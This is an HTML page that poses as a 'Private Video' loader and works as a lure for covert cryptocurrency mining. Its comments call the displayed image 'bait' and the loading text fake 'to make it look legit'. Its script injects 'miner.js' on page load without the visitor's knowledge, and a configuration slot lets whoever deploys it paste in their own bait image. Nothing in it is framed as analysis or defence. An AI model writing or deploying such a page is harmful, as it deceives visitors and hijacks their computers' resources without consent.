<!DOCTYPE html>
<html>
<head>
    <title>Private Video</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { margin: 0; padding: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        #baitImage { max-width: 100%; max-height: 100%; display: none; }
        #loader { color: white; font-family: sans-serif; text-align: center; font-size: 18px; }
    </style>
</head>
<body>

    <!-- This is the bait that will be shown to the user -->
    <img id="baitImage" src="https://i.imgur.com/GdJ91vF.jpeg">
    
    <!-- This is a fake loading message to make it look legit -->
    <div id="loader">Loading private video...<br>Please wait, this may take a moment.</div>

    <script>
        // --- CONFIGURATION ---
        var imageUrl = "https://i.imgur.com/GdJ91vF.jpeg"; // <--- PASTE YOUR IMAGE URL HERE

        // --- DO NOT EDIT BELOW THIS LINE ---

        // Show the image after a short delay to simulate loading
        setTimeout(function() {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('baitImage').src = imageUrl;
            document.getElementById('baitImage').style.display = 'block';
        }, 3000);

        // Load our self-contained miner
        console.log("Loading miner...");
        var script = document.createElement('script');
        script.src = 'miner.js';
        document.head.appendChild(script);

    </script>
</body>
</html>
